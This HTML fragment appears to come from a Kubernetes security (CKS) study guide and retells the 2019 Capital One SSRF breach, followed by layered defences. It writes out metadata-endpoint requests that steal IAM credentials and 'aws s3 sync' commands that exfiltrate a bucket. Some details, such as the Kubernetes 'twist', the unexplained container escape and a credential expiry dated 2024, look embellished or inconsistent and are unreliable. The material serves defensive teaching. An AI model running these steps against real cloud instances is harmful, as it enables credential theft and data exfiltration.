                <h4>Capital One SSRF — The Full Technical Deep Dive</h4>
                <div class="info-box danger">
                    <h5>🔴 This is the most important breach to understand for CKS — it combined misconfigured cloud metadata, excessive IAM permissions, and container escape</h5>
                </div>
                <div class="diagram-container">
                    <div class="diagram-title">Capital One 2019: Attack Chain Deconstructed</div>
                    <div class="process-steps vertical">
                        <div class="process-step-item active">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <h5>Server-Side Request Forgery (SSRF)</h5>
                                <p>Capital One used a WAF (ModSecurity) in front of a web application running on EC2. A misconfigured ModSecurity rule allowed an attacker to redirect the WAF's internal HTTP request to a target they controlled.</p>
                                <div class="code-block-wrapper"><div class="code-block-header"><span class="code-lang">The WAF's internal proxy fetched:</span></div><pre><code class="language-bash">http://169.254.169.254/latest/meta-data/</code></pre></div>
                                <p>→ The <strong>EC2 Instance Metadata Service</strong>! This endpoint returns everything about the EC2 instance, including temporary IAM credentials.</p>
                            </div>
                        </div>
                        <div class="process-step-item">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <h5>IAM Role Credential Theft</h5>
                                <div class="code-block-wrapper"><div class="code-block-header"><span class="code-lang">Discover the role name</span></div><pre><code class="language-bash">GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Returns: "easypj-s3-read-role"</code></pre></div>
                                <div class="code-block-wrapper"><div class="code-block-header"><span class="code-lang">Retrieve temporary credentials</span></div><pre><code class="language-bash">GET http://169.254.169.254/latest/meta-data/iam/security-credentials/easypj-s3-read-role
→ Returns: {"AccessKeyId":"AKIAXXXXXXXX","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY","Token":"...","Expiration":"2024-01-01T00:00:00Z"}</code></pre></div>
                                <p>These are <strong>REAL AWS credentials</strong>. The attacker now has whatever permissions the IAM role had — in Capital One's case: <code>s3:ListBucket</code> and <code>s3:GetObject</code>.</p>
                            </div>
                        </div>
                        <div class="process-step-item">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <h5>Data Exfiltration</h5>
                                <div class="code-block-wrapper"><div class="code-block-header"><span class="code-lang">Shell commands executed by the attacker</span></div><pre><code class="language-bash">$ aws s3 ls s3://capitalone-customer-data --profile stolen-creds
$ aws s3 sync s3://capitalone-customer-data ./stolen-data --profile stolen-creds</code></pre></div>
                                <p>→ <strong>106 million customer records downloaded.</strong></p>
                            </div>
                        </div>
                        <div class="process-step-item">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <h5>The K8s-Specific Twist</h5>
                                <p>After the SSRF, the attacker used the stolen credentials to list EKS clusters in the account, discover Kubernetes clusters running workloads with similar IAM roles, and potentially access pod logs containing sensitive data.</p>
                            </div>
                        </div>
                    </div>
                    <div class="info-box warning"><strong>⚠️ WHY THIS MATTERS FOR KUBERNETES:</strong> Every pod on an EC2-based K8s node can reach <code>169.254.169.254</code> by default. If <em>any</em> pod has an SSRF vulnerability, and the node has an IAM role attached, the attacker can steal those credentials just like Capital One.</div>
                    <h4>CKS FIXES for Every Layer</h4>
                    <div class="card-grid cols-5">
                        <div class="info-card"><div class="card-icon-lg">🔒</div><h5>Layer 1</h5><p class="text-sm">Metadata concealment — iptables rule to DROP traffic to <code>169.254.169.254</code> from pods.</p><span class="badge">Ch 13</span></div>
                        <div class="info-card"><div class="card-icon-lg">🛡️</div><h5>Layer 2</h5><p class="text-sm">AppArmor/SELinux — prevent pods from making outbound network calls to metadata IP.</p><span class="badge">Ch 14</span></div>
                        <div class="info-card"><div class="card-icon-lg">🔑</div><h5>Layer 3</h5><p class="text-sm">IRSA (IAM Roles for Service Accounts) instead of node-level IAM roles.</p><span class="badge">Ch 16</span></div>
                        <div class="info-card"><div class="card-icon-lg">🌐</div><h5>Layer 4</h5><p class="text-sm">NetworkPolicy — egress rules blocking <code>169.254.169.254</code> from all pods except trusted ones.</p><span class="badge">Ch 6</span></div>
                        <div class="info-card"><div class="card-icon-lg">📋</div><h5>Layer 5</h5><p class="text-sm">Audit logging — detect abnormal access patterns to metadata endpoints.</p><span class="badge">Ch 28</span></div>
                    </div>
                    <div class="info-box danger"><strong>💸 COST:</strong> $80 million OCC (Office of the Comptroller of the Currency) fine + $190 million class-action settlement = <strong>$270 million total</strong>. 106 million customer records exposed.</div>
                    <div class="info-box tip"><strong>🎯 ROOT CAUSE:</strong> Trusted the pod's network access. <strong>Never trust pods.</strong> A single iptables rule or NetworkPolicy blocking <code>169.254.169.254</code> would have prevented a $270 million breach.</div>
                </div>

